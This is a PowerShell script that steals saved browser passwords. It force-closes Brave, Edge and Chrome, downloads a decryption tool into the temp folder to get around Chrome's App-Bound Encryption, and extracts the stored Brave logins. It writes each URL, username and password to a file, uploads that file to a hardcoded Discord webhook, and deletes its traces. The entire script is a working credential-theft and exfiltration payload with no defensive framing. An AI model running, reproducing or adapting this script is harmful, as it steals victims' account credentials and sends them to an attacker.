$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

function Send-Discord {
    param([string]$msg)
    $body = @{content=$msg.Substring(0,[Math]::Min(1900,$msg.Length))} | ConvertTo-Json
    Invoke-RestMethod -Uri $wh -Method Post -Body $body -ContentType "application/json" | Out-Null
}

Send-Discord "🚀 Downloading ChromeElevator to bypass App-Bound Encryption..."

Get-Process brave,msedge,chrome -EA 0 | Stop-Process -Force -EA 0
Start-Sleep 5

cd $env:TEMP

try {
    [Net.ServicePointManager]::SecurityProtocol = 'Tls12'
    
    # Télécharger ChromeElevator
    Invoke-WebRequest "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v1.0.0/chromelevator.exe" -OutFile "ce.exe" -UseBasicParsing
    
    if (!(Test-Path "ce.exe")) {
        Send-Discord "❌ Download failed"
        exit
    }
    
    Send-Discord "✅ ChromeElevator downloaded, extracting Brave passwords..."
    
    # Exécuter ChromeElevator
    $output = .\ce.exe brave --output passwords.json 2>&1 | Out-String
    
    Start-Sleep 5
    
    if (Test-Path "passwords.json") {
        $data = Get-Content "passwords.json" -Raw | ConvertFrom-Json
        
        if ($data.passwords) {
            $count = $data.passwords.Count
            Send-Discord "✅ Found $count passwords!"
            
            $report = "BRAVE PASSWORDS (v20 decrypted)`n" + ("="*50) + "`n`n"
            
            foreach ($pwd in $data.passwords) {
                $report += "URL: $($pwd.url)`n"
                $report += "Username: $($pwd.username)`n"
                $report += "Password: $($pwd.password)`n`n"
            }
            
            $report | Out-File "decrypted.txt" -Encoding UTF8
            
            # Upload via curl
            curl.exe -F "file=@decrypted.txt" $wh 2>$null
            
            Remove-Item "decrypted.txt" -Force
        } else {
            Send-Discord "⚠️ JSON found but no passwords inside"
            Send-Discord $output
        }
        
        Remove-Item "passwords.json" -Force
    } else {
        Send-Discord "❌ No JSON output created"
        Send-Discord "Output: $output"
    }
    
    Remove-Item "ce.exe" -Force -EA 0
    
} catch {
    Send-Discord "❌ Error: $($_.Exception.Message)"
}

Send-Discord "🏁 Finished"
